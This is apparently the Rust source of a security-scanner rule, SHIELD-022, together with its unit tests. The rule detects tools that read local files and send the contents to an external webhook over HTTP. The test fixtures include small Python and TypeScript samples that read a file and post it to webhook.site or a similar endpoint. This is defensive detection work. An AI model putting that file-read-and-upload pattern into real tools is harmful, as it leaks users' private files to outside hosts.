use once_cell::sync::Lazy;
use regex::Regex;

use crate::ir::{Language, ScanTarget, SourceLocation};
use crate::rules::{
    AttackCategory, Confidence, Detector, Evidence, Finding, OwaspMcp, RuleMetadata, Severity,
};

/// SHIELD-022: Local File Exfiltration via Webhook
///
/// Detects tools that read local file system contents and forward them
/// to an external HTTP webhook, API endpoint, or multipart upload (CWE-200).
pub struct WebhookFileExfilDetector;

// Matches local file read operations in Python
static PY_FILE_READ_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?x)
        (?:open\s*\([^)]+\)\.read(?:lines|bytes|text)?\s*\(|
        Path\s*\([^)]+\)\.read_(?:text|bytes)\s*\(|
        with\s+open\s*\([^)]+\)\s+as\s+(\w+):)
    "#,
    )
    .expect("static regex pattern is valid")
});

// Matches outbound HTTP POST/upload operations in Python
static PY_HTTP_POST_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?x)
        (?:requests|httpx|urllib\.request|aiohttp|session|client)\s*\.\s*
        (?:post|put|patch)\s*\([^)]*(?:data|json|files|content)\s*=\s*
    "#,
    )
    .expect("static regex pattern is valid")
});

// Matches local file read operations in TypeScript / JS
static TS_FILE_READ_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?x)
        (?:fs|promises)\s*\.\s*
        (?:readFileSync|readFile)\s*\(
    "#,
    )
    .expect("static regex pattern is valid")
});

// Matches outbound HTTP POST/upload in TypeScript / JS
static TS_HTTP_POST_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?x)
        (?:fetch|axios\s*\.\s*(?:post|put|patch)|client\s*\.\s*(?:post|put))\s*\(
        [^)]*(?:body|data|FormData)
    "#,
    )
    .expect("static regex pattern is valid")
});

impl Detector for WebhookFileExfilDetector {
    fn metadata(&self) -> RuleMetadata {
        RuleMetadata {
            id: "SHIELD-022".into(),
            name: "Local File Exfiltration via Webhook".into(),
            description: "Local file system contents read and transmitted directly to an external HTTP webhook or endpoint"
                .into(),
            default_severity: Severity::Critical,
            attack_category: AttackCategory::DataExfiltration,
            cwe_id: Some("CWE-200".into()),
            owasp_mcp: Some(OwaspMcp::DataExfiltration),
        }
    }

    fn run(&self, target: &ScanTarget) -> Vec<Finding> {
        let mut findings = Vec::new();

        for source in &target.source_files {
            match source.language {
                Language::Python => {
                    let has_file_read = PY_FILE_READ_RE.is_match(&source.content);
                    let has_http_post = PY_HTTP_POST_RE.is_match(&source.content);

                    if has_file_read && has_http_post {
                        let mut read_line_num = 1;
                        let mut post_line_num = 1;

                        for (idx, line) in source.content.lines().enumerate() {
                            if PY_FILE_READ_RE.is_match(line) {
                                read_line_num = idx + 1;
                            }
                            if PY_HTTP_POST_RE.is_match(line) {
                                post_line_num = idx + 1;
                            }
                        }

                        let loc = SourceLocation {
                            file: source.path.clone(),
                            line: post_line_num,
                            column: 1,
                            end_line: Some(post_line_num),
                            end_column: None,
                        };

                        findings.push(Finding {
                            rule_id: "SHIELD-022".into(),
                            rule_name: "Local File Exfiltration via Webhook".into(),
                            severity: Severity::Critical,
                            confidence: Confidence::High,
                            attack_category: AttackCategory::DataExfiltration,
                            message: format!(
                                "Tool in '{}' reads local file system data (line {}) and sends outbound HTTP payload (line {})",
                                source.path.display(),
                                read_line_num,
                                post_line_num
                            ),
                            location: Some(loc.clone()),
                            evidence: vec![
                                Evidence {
                                    description: format!("File read operation at line {read_line_num}"),
                                    location: Some(SourceLocation {
                                        file: source.path.clone(),
                                        line: read_line_num,
                                        column: 1,
                                        end_line: Some(read_line_num),
                                        end_column: None,
                                    }),
                                    snippet: None,
                                },
                                Evidence {
                                    description: format!("Outbound HTTP transmission at line {post_line_num}"),
                                    location: Some(loc),
                                    snippet: None,
                                },
                            ],
                            taint_path: None,
                            remediation: Some(
                                "Enforce strict local path restrictions and verify that sensitive file contents are never transmitted to external webhook or API endpoints without explicit user consent."
                                    .into(),
                            ),
                            cwe_id: Some("CWE-200".into()),
                        });
                    }
                }
                Language::TypeScript | Language::JavaScript => {
                    let has_file_read = TS_FILE_READ_RE.is_match(&source.content);
                    let has_http_post = TS_HTTP_POST_RE.is_match(&source.content);

                    if has_file_read && has_http_post {
                        let mut read_line_num = 1;
                        let mut post_line_num = 1;

                        for (idx, line) in source.content.lines().enumerate() {
                            if TS_FILE_READ_RE.is_match(line) {
                                read_line_num = idx + 1;
                            }
                            if TS_HTTP_POST_RE.is_match(line) {
                                post_line_num = idx + 1;
                            }
                        }

                        let loc = SourceLocation {
                            file: source.path.clone(),
                            line: post_line_num,
                            column: 1,
                            end_line: Some(post_line_num),
                            end_column: None,
                        };

                        findings.push(Finding {
                            rule_id: "SHIELD-022".into(),
                            rule_name: "Local File Exfiltration via Webhook".into(),
                            severity: Severity::Critical,
                            confidence: Confidence::High,
                            attack_category: AttackCategory::DataExfiltration,
                            message: format!(
                                "Tool in '{}' reads local file system data (line {}) and sends outbound HTTP payload (line {})",
                                source.path.display(),
                                read_line_num,
                                post_line_num
                            ),
                            location: Some(loc.clone()),
                            evidence: vec![
                                Evidence {
                                    description: format!("File read operation at line {read_line_num}"),
                                    location: Some(SourceLocation {
                                        file: source.path.clone(),
                                        line: read_line_num,
                                        column: 1,
                                        end_line: Some(read_line_num),
                                        end_column: None,
                                    }),
                                    snippet: None,
                                },
                                Evidence {
                                    description: format!("Outbound HTTP transmission at line {post_line_num}"),
                                    location: Some(loc),
                                    snippet: None,
                                },
                            ],
                            taint_path: None,
                            remediation: Some(
                                "Enforce strict local path restrictions and verify that sensitive file contents are never transmitted to external webhook or API endpoints without explicit user consent."
                                    .into(),
                            ),
                            cwe_id: Some("CWE-200".into()),
                        });
                    }
                }
                _ => {}
            }
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ir::{
        DataSurface, DependencySurface, ExecutionSurface, Framework, ProvenanceSurface, SourceFile,
    };
    use std::path::PathBuf;

    fn make_target(files: Vec<(&str, Language, &str)>) -> ScanTarget {
        ScanTarget {
            name: "test_webhook_exfil_target".into(),
            framework: Framework::Mcp,
            root_path: PathBuf::from("/test"),
            tools: Vec::new(),
            execution: ExecutionSurface::default(),
            data: DataSurface::default(),
            dependencies: DependencySurface::default(),
            provenance: ProvenanceSurface::default(),
            source_files: files
                .into_iter()
                .map(|(path, lang, content)| SourceFile {
                    path: PathBuf::from(path),
                    language: lang,
                    content: content.into(),
                    size_bytes: content.len() as u64,
                    content_hash: "hash".into(),
                })
                .collect(),
        }
    }

    #[test]
    fn detects_python_webhook_file_exfiltration() {
        let code = r#"
import requests

def upload_logs(filepath):
    content = open(filepath, 'r').read()
    requests.post("https://webhook.site/collect", data={"logs": content})
"#;
        let target = make_target(vec![("uploader.py", Language::Python, code)]);
        let detector = WebhookFileExfilDetector;
        let findings = detector.run(&target);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "SHIELD-022");
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(
            findings[0].attack_category,
            AttackCategory::DataExfiltration
        );
    }

    #[test]
    fn detects_typescript_webhook_file_exfiltration() {
        let code = r#"
import fs from 'fs';

async function sendConfig(filePath: string) {
    const data = fs.readFileSync(filePath, 'utf-8');
    await fetch('https://analytics.io/hook', {
        method: 'POST',
        body: JSON.stringify({ file: data })
    });
}
"#;
        let target = make_target(vec![("index.ts", Language::TypeScript, code)]);
        let detector = WebhookFileExfilDetector;
        let findings = detector.run(&target);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "SHIELD-022");
    }

    #[test]
    fn allows_benign_file_read_without_network() {
        let code = r#"
def parse_local_config(filepath):
    return open(filepath, 'r').read()
"#;
        let target = make_target(vec![("local.py", Language::Python, code)]);
        let detector = WebhookFileExfilDetector;
        let findings = detector.run(&target);

        assert!(findings.is_empty());
    }

    #[test]
    fn allows_benign_http_post_without_file_read() {
        let code = r#"
import requests

def notify_user(message):
    requests.post("https://slack.com/api/webhook", json={"text": message})
"#;
        let target = make_target(vec![("notify.py", Language::Python, code)]);
        let detector = WebhookFileExfilDetector;
        let findings = detector.run(&target);

        assert!(findings.is_empty());
    }
}
